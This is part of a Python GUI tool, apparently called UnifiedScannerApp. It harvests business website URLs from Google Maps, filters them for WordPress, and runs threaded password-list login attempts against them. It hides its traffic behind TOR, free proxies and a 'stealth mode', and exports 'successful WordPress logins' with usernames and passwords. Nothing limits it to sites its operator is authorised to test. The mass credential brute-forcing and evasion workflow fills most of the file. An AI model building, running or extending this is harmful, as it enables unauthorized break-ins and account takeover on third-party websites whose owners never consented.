                messagebox.showinfo("Success", "Database cleared")
    
    def create_log_tab(self):
        """Log display tab"""
        frame = ttk.Frame(self.log_tab)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.log_text = scrolledtext.ScrolledText(frame, height=30, width=100)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(pady=5)
        
        ttk.Button(btn_frame, text="Clear Logs", command=self.clear_logs).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Save Logs", command=self.save_logs).pack(side=tk.LEFT, padx=5)
    
    # ============= CALLBACK METHODS =============
    
    def log(self, message: str):
        """Add message to log"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        
        self.root.after(0, lambda: self._update_log(log_entry))
    
    def _update_log(self, message: str):
        """Update log in main thread"""
        self.log_text.insert(tk.END, message)
        self.log_text.see(tk.END)
    
    # Quick Scan methods
    def qs_browse_passwords(self):
        """Browse for password file in Quick Scan"""
        filename = filedialog.askopenfilename(
            filetypes=[("Text files", "*.txt")]
        )
        if filename:
            self.qs_pwd_var.set(filename)
    
    def start_quick_scan(self):
        """Start the automated Quick Scan workflow"""
        # Validate password file
        pwd_file = self.qs_pwd_var.get()
        if not pwd_file or not os.path.exists(pwd_file):
            messagebox.showerror("Error", "Please select a password file")
            return
        
        # Load passwords
        try:
            with open(pwd_file, 'r') as f:
                self.passwords = [line.strip() for line in f if line.strip()][:100]
            if not self.passwords:
                messagebox.showerror("Error", "Password file is empty")
                return
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load passwords: {e}")
            return
        
        self.quick_scan_running = True
        self.qs_start_btn.configure(state='disabled')
        self.qs_stop_btn.configure(state='normal')
        
        # Get settings
        countries = [c for c, var in self.qs_country_vars.items() if var.get()]
        max_urls = self.qs_max_urls_var.get()
        use_tor = self.qs_use_tor_var.get()
        use_proxies = self.qs_use_proxies_var.get()
        stealth_mode = self.qs_stealth_var.get()
        verify_wordpress = self.qs_verify_wp_var.get()
        def run_quick_scan():
            try:
                # Phase 1: Setup anonymity for scanning
                self.root.after(0, lambda: self.qs_status_var.set("Phase 1: Setting up anonymity..."))
                self.root.after(0, lambda: self.qs_progress_var.set(5))
                
                if use_tor:
                    self.log("[QUICK] Enabling TOR for scanning...")
                    if self.tor_manager.enable_tor():
                        AnonymityConfig.TOR_ENABLED = True
                    else:
                        self.log("[QUICK] TOR not available, continuing without")
                
                if use_proxies and not self.tor_manager.enabled:
                    self.log("[QUICK] Fetching proxies for scanning...")
                    self.proxy_manager.fetch_all_proxies(test_proxies=True, max_workers=30)
                    if self.proxy_manager.working_proxies:
                        AnonymityConfig.USE_FREE_PROXIES = True
                        self.log(f"[QUICK] {len(self.proxy_manager.working_proxies)} working proxies ready")
                
                if not self.quick_scan_running:
                    return
                
                # Phase 2: Discover URLs
                self.root.after(0, lambda: self.qs_status_var.set("Phase 2: Discovering URLs from Google Maps..."))
                self.root.after(0, lambda: self.qs_progress_var.set(15))
                
                self.url_collector.stealth_mode = stealth_mode
                
                def discovery_progress(current, total, collected):
                    progress = 15 + (current / total) * 35 if total > 0 else 15
                    self.root.after(0, lambda: self.qs_progress_var.set(progress))
                    self.root.after(0, lambda: self.qs_stats_var.set(
                        f"URLs: {collected} | Scanned: 0 | Found: 0 | Errors: 0"))
                
                urls = self.url_collector.collect_from_maps(
                    countries=countries,
                    max_urls=max_urls,
                    progress_callback=discovery_progress
                )
                
                self.collected_urls = urls
                self.root.after(0, self.update_url_list)
                
                # Add URLs to database
                self.add_urls_to_db(urls)
                
                # Auto-save URLs after collection
                auto_save_file = "quick_scan_urls.txt"
                try:
                    with open(auto_save_file, 'w') as f:
                        for url in sorted(urls):
                            f.write(url + '\n')
                    self.log(f"[QUICK] Auto-saved {len(urls)} URLs to {auto_save_file}")
                except Exception as e:
                    self.log(f"[QUICK] Auto-save failed: {e}")
                
                if not urls or not self.quick_scan_running:
                    self.log("[QUICK] No URLs collected or stopped")
                    return
                
                self.log(f"[QUICK] Collected {len(urls)} URLs")
                
                # Phase 2b: Verify WordPress sites (optional)
                if verify_wordpress:
                    self.root.after(0, lambda: self.qs_status_var.set(
                        f"Phase 2b: Verifying WordPress sites ({len(urls)} URLs)..."))
                    self.root.after(0, lambda: self.qs_progress_var.set(50))
                    
                    def verify_progress(current, total, url, is_wp, reason):
                        progress = 50 + (current / total) * 5 if total > 0 else 50
                        self.root.after(0, lambda: self.qs_progress_var.set(progress))
                        # Update database with verification result
                        self.root.after(0, lambda: self.update_url_verification_in_db(url, 1 if is_wp else 0))
                    
                    urls = self.scanner.verify_wordpress_urls(list(urls), progress_callback=verify_progress)
                    self.collected_urls = set(urls)
                    # Refresh database view
                    self.root.after(0, self.refresh_database_view)
                    self.root.after(0, self.update_url_list)
                    self.log(f"[QUICK] Verified {len(urls)} WordPress sites")
                
                # Phase 3: Scan WordPress sites
                self.root.after(0, lambda: self.qs_status_var.set(f"Phase 3: Scanning {len(urls)} sites..."))
                self.root.after(0, lambda: self.qs_progress_var.set(55))
                
                def scan_progress(current, total, stats):
                    progress = 55 + (current / total) * 40 if total > 0 else 55
                    self.root.after(0, lambda: self.qs_progress_var.set(progress))
                    self.root.after(0, lambda: self.qs_stats_var.set(
                        f"URLs: {len(urls)} | Scanned: {stats['scanned']} | Found: {stats['found']} | Errors: {stats['errors']}"))
                
                results = self.scanner.scan_multiple(
                    urls=list(urls),
                    passwords=self.passwords,
                    threads=3,
                    timeout=15,
                    progress_callback=scan_progress
                )
                
                # Update results tree
                for result in results:
                    tag = result['status'] if result['status'] in ['success', 'failed', 'error'] else 'error'
                    self.root.after(0, lambda r=result, t=tag: self.results_tree.insert(
                        '', 'end',
                        values=(r['url'], r['username'] or 'N/A', r['password'] or 'N/A',
                                r['status'], r['details']),
                        tags=(t,)
                    ))
                
                self.scan_results = results
                
                # Complete
                self.root.after(0, lambda: self.qs_status_var.set("Quick Scan Complete!"))
                self.root.after(0, lambda: self.qs_progress_var.set(100))
                
                found = sum(1 for r in results if r['status'] == 'success')
                self.log(f"[QUICK] Complete! Found {found} valid credentials")
                
                if found > 0:
                    self.root.after(0, lambda: messagebox.showinfo(
                        "Quick Scan Complete", 
                        f"Found {found} valid WordPress credentials!\nCheck the Results tab."))
                
            except Exception as e:
                self.log(f"[QUICK] Error: {e}")
                import traceback
                self.log(traceback.format_exc())
            finally:
                self.quick_scan_running = False
                self.root.after(0, lambda: self.qs_start_btn.configure(state='normal'))
                self.root.after(0, lambda: self.qs_stop_btn.configure(state='disabled'))
        
        threading.Thread(target=run_quick_scan, daemon=True).start()
    
    def stop_quick_scan(self):
        """Stop Quick Scan"""
        self.quick_scan_running = False
        self.url_collector.stop()
        self.scanner.stop()
        self.qs_status_var.set("Stopping...")
    
    def toggle_tor(self):
        """Toggle TOR connection"""
        if self.tor_manager.enabled:
            self.tor_manager.disable_tor()
            self.tor_status_var.set("Disabled")
            self.tor_status_label.configure(foreground='red')
            self.tor_enable_btn.configure(text="Enable TOR")
            AnonymityConfig.TOR_ENABLED = False
        else:
            if self.tor_manager.enable_tor():
                self.tor_status_var.set("Connected")
                self.tor_status_label.configure(foreground='green')
                self.tor_enable_btn.configure(text="Disable TOR")
                AnonymityConfig.TOR_ENABLED = True
            else:
                messagebox.showerror("TOR Error", 
                    "Could not connect to TOR.\n\n"
                    "Make sure TOR is running:\n"
                    "- Linux: sudo service tor start\n"
                    "- Windows: Start Tor Expert Bundle or Tor Browser")
        
        self.update_anonymity_status()
    
    def check_ip(self):
        """Check current IP"""
        def check():
            try:
                ip = self.tor_manager.get_current_ip()
                self.root.after(0, lambda: self.current_ip_var.set(ip))
                self.log(f"[IP] Current: {ip}")
            except Exception as e:
                self.root.after(0, lambda: self.current_ip_var.set(f"Error: {e}"))
        
        threading.Thread(target=check, daemon=True).start()
    
    def toggle_proxies(self):
        """Toggle proxy usage"""
        AnonymityConfig.USE_FREE_PROXIES = self.proxy_enabled_var.get()
        self.update_anonymity_status()
    
    def fetch_and_test_proxies(self):
        """Fetch and test free proxies"""
        self.fetch_proxy_btn.configure(state='disabled')
        
        def fetch():
            def progress(current, total):
                p = (current / total) * 100 if total > 0 else 0
                self.root.after(0, lambda: self.proxy_progress_var.set(p))
            
            try:
                self.proxy_manager.fetch_all_proxies(test_proxies=True, progress_callback=progress)
                count = len(self.proxy_manager.working_proxies)
                self.root.after(0, lambda: self.proxy_count_var.set(f"{count} working proxies"))
            except Exception as e:
                self.log(f"[ERROR] Proxy fetch failed: {e}")
            finally:
                self.root.after(0, lambda: self.fetch_proxy_btn.configure(state='normal'))
        
        threading.Thread(target=fetch, daemon=True).start()
    
    def save_proxies(self):
        """Save proxies to file"""
        if not self.proxy_manager.working_proxies:
            messagebox.showwarning("Warning", "No working proxies to save")
            return
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt")]
        )
        if filename:
            self.proxy_manager.save_to_file(filename)
    
    def load_proxies(self):
        """Load proxies from file"""
        filename = filedialog.askopenfilename(
            filetypes=[("Text files", "*.txt")]
        )
        if filename:
            self.proxy_manager.load_from_file(filename)
            self.proxy_count_var.set(f"{len(self.proxy_manager.working_proxies)} proxies loaded")
    
    def update_stealth_mode(self, event=None):
        """Update stealth mode"""
        AnonymityConfig.STEALTH_MODE = self.stealth_mode_var.get()
        self.url_collector.stealth_mode = self.stealth_mode_var.get()
        self.log(f"[STEALTH] Mode: {self.stealth_mode_var.get()}")
        self.update_anonymity_status()
    
    def update_anonymity_status(self):
        """Update anonymity status display"""
        self.anonymity_status.configure(state='normal')
        self.anonymity_status.delete(1.0, tk.END)
        
        status_lines = [
            f"TOR for Scanning: {'ENABLED' if self.tor_manager.enabled else 'DISABLED'}",
            f"Free Proxies for Scanning: {'ENABLED' if AnonymityConfig.USE_FREE_PROXIES else 'DISABLED'}",
            f"Working Proxies: {len(self.proxy_manager.working_proxies)}",
            f"Stealth Mode: {AnonymityConfig.STEALTH_MODE.upper()}",
        ]
        
        self.anonymity_status.insert(tk.END, '\n'.join(status_lines))
        self.anonymity_status.configure(state='disabled')
    
    def start_discovery(self):
        """Start URL discovery"""
        if not SELENIUM_AVAILABLE:
            messagebox.showerror("Error", "Selenium not installed. Cannot discover URLs.")
            return
        
        self.discover_btn.configure(state='disabled')
        self.stop_discover_btn.configure(state='normal')
        
        countries = [c for c, var in self.country_vars.items() if var.get()]
        max_urls = self.max_urls_var.get()
        verify_wordpress = self.verify_wp_var.get()
        def discover():
            def progress_callback(current, total, collected):
                progress = (current / total) * 100 if total > 0 else 0
                self.root.after(0, lambda: self.discover_progress_var.set(progress))
                self.root.after(0, lambda: self.discover_status_var.set(
                    f"Processing {current}/{total}, collected {collected} URLs"))
            
            try:
                urls = self.url_collector.collect_from_maps(
                    countries=countries,
                    max_urls=max_urls,
                    progress_callback=progress_callback
                )
                
                # Verify WordPress if enabled
                if verify_wordpress:
                    self.root.after(0, lambda: self.discover_status_var.set(
                        f"Verifying WordPress sites ({len(urls)} URLs)..."))
                    
                    def verify_progress(current, total, url, is_wp, reason):
                        status = f"[{current}/{total}] {url}... {'✓' if is_wp else '✗'}"
                        self.root.after(0, lambda: self.discover_status_var.set(status))
                        # Update database with verification result
                        self.root.after(0, lambda: self.update_url_verification_in_db(url, 1 if is_wp else 0))
                    
                    urls = self.scanner.verify_wordpress_urls(urls, progress_callback=verify_progress)
                    # Refresh database view
                    self.root.after(0, self.refresh_database_view)
                
                self.collected_urls.update(urls)
                
                self.root.after(0, self.update_url_list)
                self.root.after(0, lambda: self.discover_status_var.set(
                    f"Complete! {len(urls)} URLs collected" + (" (verified WordPress)" if verify_wordpress else "")))
                
            except Exception as e:
                self.log(f"[ERROR] Discovery failed: {e}")
            finally:
                self.root.after(0, lambda: self.discover_btn.configure(state='normal'))
                self.root.after(0, lambda: self.stop_discover_btn.configure(state='disabled'))
        
        threading.Thread(target=discover, daemon=True).start()
    
    def stop_discovery(self):
        """Stop URL discovery"""
        self.url_collector.stop()
        self.discover_status_var.set("Stopping...")
    
    def import_urls(self):
        """Import URLs from file"""
        filename = filedialog.askopenfilename(
            filetypes=[("Text files", "*.txt")]
        )
        if filename:
            try:
                with open(filename, 'r') as f:
                    urls = [line.strip() for line in f if line.strip()]
                
                # Ask if should verify WordPress
                if WP_DETECTOR_AVAILABLE and urls:
                    result = messagebox.askyesno(
                        "WordPress Verification",
                        f"Verify only WordPress sites? ({len(urls)} URLs)\n\nThis will take ~{len(urls)*10}s\n\nClick Yes to filter only WordPress, No to import all."
                    )
                    
                    if result:
                        # Verify WordPress
                        self.discover_status_var.set(f"Verifying {len(urls)} URLs for WordPress...")
                        
                        def verify_progress(current, total, url, is_wp, reason):
                            status = f"[{current}/{total}] {url}... {'✓' if is_wp else '✗'}"
                            self.root.after(0, lambda: self.discover_status_var.set(status))
                            # Update database
                            self.root.after(0, lambda: self.update_url_verification_in_db(url, 1 if is_wp else 0))
                        
                        urls = self.scanner.verify_wordpress_urls(urls, progress_callback=verify_progress)
                        self.discover_status_var.set(f"Verified {len(urls)} WordPress sites from file")
                        self.refresh_database_view()
                
                self.collected_urls.update(urls)
                self.update_url_list()
                # Add to database
                self.add_urls_to_db(set(urls))
                self.log(f"[IMPORT] Loaded {len(urls)} URLs from {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load: {e}")
    
    def check_url_in_db(self, url: str) -> bool:
        """Check if URL exists in database - used by URLCollector for duplicate detection"""
        if self.url_db:
            return self.url_db.url_exists(url)
        return False
    
    def add_urls_to_db(self, urls: set):
        """Add collected URLs to database"""
        if self.url_db:
            for url in urls:
                self.url_db.add_url(url)
            self.log(f"[DB] Added {len(urls)} URLs to database")
    
    def update_url_verification_in_db(self, url: str, is_wordpress: int):
        """Update URL verification status in database"""
        if self.url_db:
            self.url_db.update_verification(url, is_wordpress)
    
    def save_urls(self):
        """Save collected URLs to file"""
        if not self.collected_urls:
            messagebox.showwarning("Warning", "No URLs to save")
            return
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            initialfile="collected_urls.txt"
        )
        
        if filename:
            try:
                with open(filename, 'w') as f:
                    for url in sorted(self.collected_urls):
                        f.write(url + '\n')
                messagebox.showinfo("Success", f"Saved {len(self.collected_urls)} URLs to {filename}")
                self.log(f"[SAVE] Saved {len(self.collected_urls)} URLs to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save: {e}")
    
    def clear_urls(self):
        """Clear collected URLs"""
        self.collected_urls.clear()
        self.update_url_list()
    
    def update_url_list(self):
        """Update URL listbox"""
        self.url_listbox.delete(0, tk.END)
        for url in sorted(self.collected_urls):
            self.url_listbox.insert(tk.END, url)
        self.url_count_var.set(f"{len(self.collected_urls)} URLs collected")
    
    def browse_passwords(self):
        """Browse for password file"""
        filename = filedialog.askopenfilename(
            filetypes=[("Text files", "*.txt")]
        )
        if filename:
            self.pwd_file_var.set(filename)
            try:
                with open(filename, 'r') as f:
                    self.passwords = [line.strip() for line in f if line.strip()]
                self.pwd_count_var.set(f"{len(self.passwords)} passwords loaded")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load: {e}")
    
    def start_scan(self):
        """Start WordPress scanning"""
        if not self.collected_urls:
            messagebox.showwarning("Warning", "No URLs to scan. Discover or import URLs first.")
            return
        
        if not self.passwords:
            messagebox.showwarning("Warning", "No passwords loaded. Select a password file.")
            return
        
        self.scan_btn.configure(state='disabled')
        self.stop_scan_btn.configure(state='normal')
        
        # Clear previous results
        for item in self.results_tree.get_children():
            self.results_tree.delete(item)
        
        urls = list(self.collected_urls)
        passwords = self.passwords[:self.max_pwd_var.get()]
        threads = self.threads_var.get()
        timeout = self.timeout_var.get()
        
        def scan():
            def progress_callback(current, total, stats):
                progress = (current / total) * 100 if total > 0 else 0
                self.root.after(0, lambda: self.scan_progress_var.set(progress))
                self.root.after(0, lambda: self.scan_status_var.set(
                    f"Scanning {current}/{total}"))
                self.root.after(0, lambda: self.stats_var.set(
                    f"Scanned: {stats['scanned']} | Found: {stats['found']} | Errors: {stats['errors']}"))
            
            try:
                results = self.scanner.scan_multiple(
                    urls=urls,
                    passwords=passwords,
                    threads=threads,
                    timeout=timeout,
                    progress_callback=progress_callback
                )
                
                for result in results:
                    tag = result['status'] if result['status'] in ['success', 'failed', 'error'] else 'error'
                    self.root.after(0, lambda r=result, t=tag: self.results_tree.insert(
                        '', 'end',
                        values=(r['url'], r['username'] or 'N/A', r['password'] or 'N/A',
                                r['status'], r['details']),
                        tags=(t,)
                    ))
                
                self.scan_results = results
                self.root.after(0, lambda: self.scan_status_var.set("Scan complete!"))
                
            except Exception as e:
                self.log(f"[ERROR] Scan failed: {e}")
            finally:
                self.root.after(0, lambda: self.scan_btn.configure(state='normal'))
                self.root.after(0, lambda: self.stop_scan_btn.configure(state='disabled'))
        
        threading.Thread(target=scan, daemon=True).start()
    
    def stop_scan(self):
        """Stop scanning"""
        self.scanner.stop()
        self.scan_status_var.set("Stopping...")
    
    def export_results(self):
        """Export all results to CSV"""
        if not self.scan_results:
            messagebox.showwarning("Warning", "No results to export")
            return
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".csv",
            filetypes=[("CSV files", "*.csv")]
        )
        if filename:
            try:
                with open(filename, 'w') as f:
                    f.write("URL,Username,Password,Status,Details\n")
                    for r in self.scan_results:
                        line = f"{r['url']},{r['username'] or 'N/A'},{r['password'] or 'N/A'},{r['status']},{r['details']}\n"
                        f.write(line)
                messagebox.showinfo("Success", f"Results exported to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export: {e}")
    
    def export_success_only(self):
        """Export only successful results"""
        success_results = [r for r in self.scan_results if r['status'] == 'success']
        
        if not success_results:
            messagebox.showwarning("Warning", "No successful results to export")
            return
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt")]
        )
        if filename:
            try:
                with open(filename, 'w') as f:
                    f.write("=== SUCCESSFUL WORDPRESS LOGINS ===\n\n")
                    for r in success_results:
                        f.write(f"URL: {r['url']}\n")
                        f.write(f"Username: {r['username']}\n")
                        f.write(f"Password: {r['password']}\n")
                        f.write("-" * 50 + "\n")
                messagebox.showinfo("Success", f"Results exported to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export: {e}")
    
    def clear_results(self):
        """Clear results"""
        for item in self.results_tree.get_children():
            self.results_tree.delete(item)
        self.scan_results = []
        self.stats_var.set("Scanned: 0 | Found: 0 | Errors: 0")
    
    def clear_logs(self):
        """Clear log display"""
        self.log_text.delete(1.0, tk.END)
    
    def save_logs(self):
        """Save logs to file"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt")]
        )
        if filename:
            try:
                with open(filename, 'w') as f:
                    f.write(self.log_text.get(1.0, tk.END))
                messagebox.showinfo("Success", f"Logs saved to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save: {e}")


# ============= MAIN =============

def main():
    """Main entry point"""
    # Only disable SSL warnings if certificate verification is explicitly disabled.
    if not config.VERIFY_SSL:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # Configure Python logging based on configuration
    if config.LOG_LEVEL:
        numeric_level = getattr(logging, config.LOG_LEVEL.upper(), None)
        if isinstance(numeric_level, int):
            logging.basicConfig(level=numeric_level)

    # Create and run app
    root = tk.Tk()
    app = UnifiedScannerApp(root)

    # Handle window close
    def on_close():
        if config.AUTO_CLEANUP_ON_EXIT:
            CleanupManager.cleanup_files()
        root.destroy()

    root.protocol("WM_DELETE_WINDOW", on_close)
    root.mainloop()


if __name__ == "__main__":
    main()
